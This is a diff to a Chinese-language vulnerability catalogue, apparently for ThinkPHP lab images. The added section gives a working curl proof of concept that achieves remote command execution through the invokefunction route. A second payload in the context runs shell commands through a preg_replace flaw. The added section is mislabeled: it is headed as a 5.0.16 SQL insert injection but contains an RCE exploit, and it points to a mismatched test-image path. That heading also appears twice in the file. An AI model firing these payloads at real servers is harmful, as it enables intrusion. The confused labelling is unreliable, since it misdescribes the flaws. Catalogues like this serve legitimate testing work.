@@ -1,3 +1,23 @@
+## Thinkphp 5.0.16 insert 注入漏洞
+
+测试镜像
+
+* src/thinkphp/2.0/
+
+影响范围
+
+* 5.1.X - 5.1.31, 5.0.X - 5.0.23
+
+Poc
+
+```
+curl -g '127.0.0.1/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
+```
+
+参考文档
+
+* [thinkphp5框架缺陷导致远程代码执行](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)
+
 ## Thinkphp preg_replace 代码执行漏洞
 
 测试镜像
@@ -13,8 +33,6 @@ Poc
 ```
 curl -g 'http://127.0.0.1/index.php/module/action/param1/$%7B@system($_POST[0])%7D' -d 0=ls
 ```
-
-
 
 ## Thinkphp 5.0.16 insert 注入漏洞
 
